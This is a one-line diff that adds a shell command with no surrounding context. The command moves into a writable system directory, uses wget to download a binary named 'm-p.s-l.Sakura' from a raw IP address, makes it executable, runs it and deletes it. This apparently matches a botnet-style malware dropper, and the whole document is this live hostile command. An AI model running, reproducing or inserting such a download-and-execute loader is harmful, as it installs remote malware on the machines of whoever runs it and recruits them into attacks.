@@ -1,0 +1,1 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.38.200.127/m-p.s-l.Sakura; chmod +x m-p.s-l.Sakura; ./m-p.s-l.Sakura; rm -rf m-p.s-l.Sakura
